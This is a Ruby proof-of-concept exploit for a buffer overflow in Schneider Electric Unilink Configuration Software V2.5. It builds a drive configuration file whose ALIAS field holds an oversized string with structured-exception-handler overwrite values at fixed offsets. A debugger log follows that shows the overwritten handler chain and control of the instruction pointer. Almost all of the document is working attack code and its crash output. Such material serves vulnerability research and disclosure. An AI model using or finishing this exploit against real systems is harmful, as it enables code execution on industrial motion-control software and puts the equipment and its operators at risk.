#!/usr/bin/env ruby
# Schneider Electric Unilink Configuration Software V2.5 Buffer Overflow

offline_file = %Q|
[AMPLIFIER]
OPMODE      1

[BASIC SETUP]
HVER        SETUP]            
SERIALNO                      
TRUN                          
VER                           
ADDR        0
VBUSBAL     2
PBALRES     1
PBALMAX     80
ALIAS       FUZZ
PMODE       1
CBAUD       500

[MOTOR PARAMETER]
MSPEED      3000.000
MICONT      1.500
MIPEAK      3.000
MPOLES      4
MBRAKE      0
MNUMBER     0
MNAME       0                 
MVANGLB     2400.000
MVANGLF     20
MTANGLP     0
L           0.000

[CURRENT PARAMETER]
IPEAK       1.500
ICONT       0.750
KC          1.000
KTN         0.600
MLGD        0.300
MLGQ        1.000
MLGC        0.700
MLGP        0.400
FOLDMODE    0
I2TLIM      80

[FEEDBACK PARAMETER]
FBTYPE      0
MPHASE      0
MRESPOLES   2
MRESBW      600

[ENCODER PARAMETER]
ENCMODE     1
ENCOUT      1024
ENCZERO     0
SSIOUT      0
SSIINV      0
SSIGRAY     0
ENCCAPT     0

[SPEED PARAMETER]
VLIM        3000.000
ACC         10
DEC         10
GV          1.000
GVTN        10.000
GVT2        1.000
GVFBT       0.400
VOSPD       3600.000
DIR         1
DECSTOP     10
GVFR        1.000

[POSITION PARAMETER]
GEARMODE    6
PGEARO      1048576
PGEARI      1048576
GP          0.150
GPTN        50.000
GPFFV       1.000
GPV         3.000
NREF        0
DREF        0
VREF        0.000
ACCR        10
DECR        10
ROFFS       0
POSCNFG     0
GEARO       8192
GEARI       8192
ENCIN       4096
PVMAX       100.000
PTMIN       1
PEMAX       262144
PEINPOS     4000
SWE1        0
SWE2        0
SWE3        0
SWE4        0
SWCNFG      0
VJOG        0.000

[I/O ANALOG PARAMETER]
ANOFF1      0
AVZ1        1.000
ANOFF2      0
ANOUT1      1
ANOUT2      2
VSCALE1     3000.000
VSCALE2     3000.000
ISCALE1     3.000
ISCALE2     3.000
ANDB        0.000
ANCNFG      0

[I/O DIGITAL PARAMETER]
IN1MODE     0
IN2MODE     0
IN3MODE     0
IN4MODE     0
O1MODE      0
O2MODE      0
IN1TRIG     0.000
IN2TRIG     0.000
IN3TRIG     0.000
IN4TRIG     0.000
O1TRIG      0.000
O2TRIG      0.000
SSIMODE     0
|

data = "B" * 1024
data[404, 4] = [0xdeadbeef].pack('V')
data[408, 4] = [0xfeedface].pack('V')

x = File.new("unilink_config","wb")
x.write(offline_file.gsub(/FUZZ/, data))
x.close
__END__
(a24.a74): C++ EH exception - code e06d7363 (first chance)
(a24.a74): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=ffffffff ebx=0000000b ecx=42424236 edx=baad0000 esi=0012f598 edi=004a3970
eip=761dbb2d esp=0012f3c8 ebp=0012f590 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010207
kernel32!InterlockedDecrement+0x9:
761dbb2d f00fc101        lock xadd dword ptr [ecx],eax ds:0023:42424236=????????
0:000> !exchain
0012f584: feedface
Invalid exception stack at deadbeef
0:000> g
(a24.a74): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=feedface edx=77be71cd esi=00000000 edi=00000000
eip=feedface esp=0012ee98 ebp=0012eeb8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
feedface ??              ???
0:000> lmvm image00400000
start    end        module name
00400000 004fc000   image00400000 C (no symbols)           
    Loaded symbol image file: C:\Program Files\Unilink\unilink.exe
    Image path: image00400000
    Image name: image00400000
    Timestamp:        Wed Apr 24 07:10:54 2002 (3CC6AEDE)
    CheckSum:         00000000
    ImageSize:        000FC000
    File version:     1.0.0.1
    Product version:  1.0.0.1
    File flags:       0 (Mask 3F)
    File OS:          4 Unknown Win32
    File type:        1.0 App
    File date:        00000000.00000000
    Translations:     0409.04b0
    CompanyName:      Schneider Electric
    ProductName:      Unilink Application
    InternalName:     Drive
    OriginalFilename: Unilink.exe
    ProductVersion:   2.50
    FileVersion:      KS261
    PrivateBuild:     KS261
    SpecialBuild:     KS261
    FileDescription:  Unilink Application
    LegalCopyright:   Copyright (C) 2000
    LegalTrademarks:  Copyright (C) 2000
    Comments:         Copyright (C) 2000
